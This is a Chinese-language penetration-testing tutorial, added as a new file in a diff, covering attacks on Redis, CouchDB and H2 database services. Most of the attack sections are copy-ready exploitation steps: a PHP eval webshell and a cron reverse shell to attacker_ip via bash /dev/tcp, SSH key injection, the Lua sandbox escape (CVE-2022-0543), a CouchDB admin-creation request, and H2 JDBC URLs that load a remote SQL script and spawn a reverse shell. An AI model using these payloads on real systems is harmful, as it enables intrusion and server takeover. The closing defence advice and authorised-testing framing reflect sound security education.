@@ -1,0 +1,257 @@
+在渗透测试与红蓝对抗中，数据库服务是攻击者重点关注的目标。由于配置不当、版本滞后或未授权访问等问题，数据库常常成为突破口，甚至直接导致服务器失陷。本文将以Redis、Couchdb、H2database三类典型数据库为例，结合漏洞原理与实战利用方法，深入探讨数据库服务攻防技术，帮助安全人员更好地理解风险并提升防御能力。
+
+---
+
+一、前置知识
+
+1. 漏洞复现环境
+
+· Vulhub：https://vulhub.org/  提供基于Docker的漏洞环境，一键搭建。
+· Vulfocus：https://vulfocus.cn/  在线漏洞演练平台，也可本地部署。
+  · 官方手册：https://fofapro.github.io/vulfocus/#/
+  · 搭建踩坑：若遇到镜像同步失败等问题，可参考 https://blog.csdn.net/m0_64563956/article/details/131229046
+
+2. 服务判断技巧
+
+· 端口扫描：通过Nmap等工具探测开放端口，识别服务类型（如Redis 6379、Couchdb 5984、H2 20051）。
+· 组合判断：结合常见应用架构分析可能开放的数据库服务（如LAMP环境常有MySQL，SpringBoot应用常有H2内存数据库）。
+· 信息获取：直接访问端口查看返回的Banner、版本信息或默认页面（如Couchdb的/_utils/管理界面）。
+· 强弱特征：如Shiro框架的rememberMe强特征，SpringBoot默认错误页面等，可用于辅助判断。
+
+3. 对象类别划分
+
+根据服务功能将数据库分为：
+
+· 键值存储数据库：如Redis，弱点是未授权访问、写文件等。
+· 文档型数据库：如Couchdb，常见漏洞包括权限绕过、命令执行。
+· 内存/嵌入式数据库：如H2，常因配置不当导致JNDI注入或JDBC RCE。
+
+理解服务功能有助于快速定位攻击面：有认证机制即可尝试弱口令爆破；有文件读写功能即可尝试写入webshell或密钥；有历史漏洞则可针对性测试。
+
+4. 利用方法分类
+
+· 配置不当：如Redis未授权访问、H2控制台暴露。
+· CVE漏洞：利用公开的漏洞POC/EXP。
+· 未授权访问：直接访问服务获取敏感信息或操作权限。
+· 弱口令爆破：针对默认或弱密码进行爆破。
+· 功能利用：利用服务自身功能（如Redis的SAVE命令写文件）实施攻击。
+
+---
+
+二、Redis漏洞实战
+
+Redis默认端口：6379
+Redis是一套基于内存的高性能键值数据库，若未正确配置认证，可导致严重安全风险。
+
+1. 未授权访问（CNVD-2015-07557）
+
+漏洞成因：redis.conf中未绑定IP、未设置密码、保护模式关闭。
+
+```bash
+# 危险配置示例
+bind 127.0.0.1  # 注释掉即允许所有IP
+protected-mode no
+requirepass ""   # 密码为空
+```
+
+利用方式一：写Webshell
+
+条件：Web目录可写（需知道绝对路径）
+
+```bash
+redis-cli -h target_ip
+config set dir /var/www/html        # 设置写入目录
+config set dbfilename shell.php     # 设置文件名
+set payload "<?php @eval($_POST['c']);?>"
+save
+```
+
+注意：若目录无写权限则失败。
+
+利用方式二：写定时任务反弹Shell
+
+条件：Redis以root运行，保护模式关闭
+
+```bash
+config set dir /var/spool/cron/
+set yyy "\n\n\n* * * * * bash -i >& /dev/tcp/attacker_ip/5566 0>&1\n\n\n"
+config set dbfilename x
+save
+```
+
+注意：CentOS会忽略乱码执行计划任务，Ubuntu则不会，因此成功率受系统影响。
+
+利用方式三：写入SSH公钥
+
+条件：Redis以root运行，目标允许密钥登录
+
+```bash
+# 攻击机生成密钥对
+ssh-keygen -t rsa
+cd /root/.ssh/
+(echo -e "\n\n"; cat id_rsa.pub; echo -e "\n\n") > key.txt
+cat key.txt | redis-cli -h target_ip -x set pub_key
+
+# 连接Redis写入authorized_keys
+redis-cli -h target_ip
+config set dir /root/.ssh/
+config set dbfilename authorized_keys
+save
+
+# 攻击机登录
+ssh -i id_rsa root@target_ip
+```
+
+2. 未授权访问-RCE（CNVD-2019-21763）
+
+漏洞描述：Redis 4.x及以上版本支持模块动态加载，攻击者可利用未授权访问加载恶意.so模块实现RCE。
+利用工具：redis-rogue-getshell
+
+```bash
+python redis-master.py -r target_ip -p 6379 -L attacker_ip -P 8888 -f exp.so -c "id"
+```
+
+或使用 redis-rogue-server
+
+```bash
+python redis-rogue-server.py --rhost target_ip --rport 6379 --lhost attacker_ip
+```
+
+3. 沙箱绕过RCE（CVE-2022-0543）
+
+漏洞描述：Debian/Ubuntu等系统打包的Redis存在Lua沙箱绕过，通过package.loadlib加载系统库执行命令。
+POC：
+
+```bash
+eval 'local io_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io"); local io = io_l(); local f = io.popen("id", "r"); local res = f:read("*a"); f:close(); return res' 0
+```
+
+注意：不同系统liblua路径可能不同，需提前探知。
+
+---
+
+三、Couchdb漏洞实战
+
+Couchdb默认端口：5984
+Couchdb是一个基于JSON的NoSQL数据库，提供RESTful API。
+
+1. 垂直权限绕过（CVE-2017-12635）
+
+漏洞原理：Couchdb处理JSON中roles字段时存在缺陷，可通过PUT请求创建管理员用户。
+利用步骤：
+
+1. 发送PUT请求创建用户xiaodi，密码xiaodi，并在roles中包含_admin。
+
+```http
+PUT /_users/org.couchdb.user:xiaodi HTTP/1.1
+Host: target_ip:5984
+Content-Type: application/json
+Content-Length: 108
+
+{
+  "type": "user",
+  "name": "xiaodi",
+  "roles": ["_admin"],
+  "password": "xiaodi"
+}
+```
+
+1. 访问http://target_ip:5984/_utils/，使用xiaodi/xiaodi登录即可获取管理员权限。
+
+2. 命令执行（CVE-2017-12636）
+
+漏洞原理：通过创建临时视图，利用script字段执行任意命令。
+利用脚本：使用官方exp.py
+
+```bash
+# 修改exp.py中的目标IP和反弹地址
+python3 exp.py target_ip 5984
+```
+
+脚本会依次创建用户、添加权限、执行命令。
+
+3. 代码执行（CVE-2022-24706）
+
+漏洞原理：Couchdb的epmd（Erlang端口映射守护进程，端口4369）存在未授权访问，结合Erlang分布式协议可RCE。
+利用POC：poc.py
+
+```bash
+python poc.py target_ip 4369
+```
+
+---
+
+四、H2database漏洞实战
+
+H2database默认端口：20051
+H2是一个Java嵌入式数据库，常出现在SpringBoot等Java应用中。
+
+1. JNDI RCE（CVE-2021-42392）
+
+漏洞描述：H2控制台（<2.1.210）允许攻击者通过JDBC URL触发JNDI注入，进而RCE。
+利用条件：可访问H2控制台（通常/h2-console）
+步骤：
+
+1. 在攻击机启动JNDI服务（如Java-Chains）。
+2. 在H2登录页面设置：
+   · Driver Class: javax.naming.InitialContext
+   · JDBC URL: jdbc:h2:mem:test;MODE=MSSQLServer;INIT=CREATE TRIGGER SHELL BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript Java.type('java.lang.Runtime').getRuntime().exec('bash -c {echo,base64编码的反弹命令}|{base64,-d}|{bash,-i}')$$
+     或使用JNDI生成的URL，如ldap://attacker_ip:1389/Exploit
+3. 点击连接触发JNDI注入，获得反弹Shell。
+
+2. JDBC RCE（CVE-2022-23221）
+
+漏洞描述：H2支持通过INIT参数在连接时执行SQL脚本，若允许加载远程SQL文件，可导致RCE。
+利用步骤：
+
+1. 构造恶意SQL文件h2.sql：
+
+```sql
+CREATE TABLE test (id INT NOT NULL);
+CREATE TRIGGER TRIG_JS BEFORE INSERT ON test AS '//javascript
+Java.type("java.lang.Runtime").getRuntime().exec("bash -c {echo,base64编码的反弹命令}|{base64,-d}|{bash,-i}");';
+```
+
+1. 在攻击机启动HTTP服务提供该文件：
+
+```bash
+python3 -m http.server 88
+```
+
+1. 连接H2数据库，填入JDBC URL：
+
+```
+jdbc:h2:mem:test1;FORBID_CREATION=FALSE;IGNORE_UNKNOWN_SETTINGS=TRUE;INIT=RUNSCRIPT FROM 'http://attacker_ip:88/h2.sql'
+```
+
+1. 连接后触发器被执行，攻击机监听端口获得Shell。
+
+---
+
+五、总结与防御建议
+
+常见攻击路径总结
+
+数据库 漏洞类型 关键利用点 影响版本
+Redis 未授权访问 写文件/定时任务/SSH密钥 所有版本
+Redis 模块加载RCE 加载恶意模块 4.x+
+Redis Lua沙箱绕过 package.loadlib Debian/Ubuntu包
+Couchdb 权限绕过 roles字段处理缺陷 <2.1.0
+Couchdb 命令执行 临时视图script <2.1.1
+Couchdb Erlang分布式RCE epmd未授权 <3.2.2
+H2 JNDI注入 JDBC URL JNDI <2.1.210
+H2 JDBC远程加载脚本 INIT参数加载远程SQL <2.1.210
+
+防御措施
+
+1. 网络层：限制数据库端口仅对内网开放，避免公网暴露。
+2. 认证与授权：强制设置强密码，开启保护模式，禁用默认账号。
+3. 版本更新：及时升级至安全版本，修复已知CVE。
+4. 最小权限：运行Redis等服务时使用低权限账号，避免root运行。
+5. 安全配置：
+   · Redis：绑定127.0.0.1，启用requirepass，设置rename-command禁用危险命令。
+   · Couchdb：禁用/_utils管理界面，限制/_users的访问。
+   · H2：关闭控制台远程访问，生产环境禁止使用H2内存数据库。
+6. 入侵检测：监控异常命令（如Redis的CONFIG SET），及时告警。
+
+通过本文的实战剖析，读者应能深入理解这三类数据库的漏洞原理及利用技巧。在实际攻防中，务必遵守法律法规，仅对授权目标进行测试。防御方则需举一反三，从配置、补丁、监控多维度加固数据库安全。
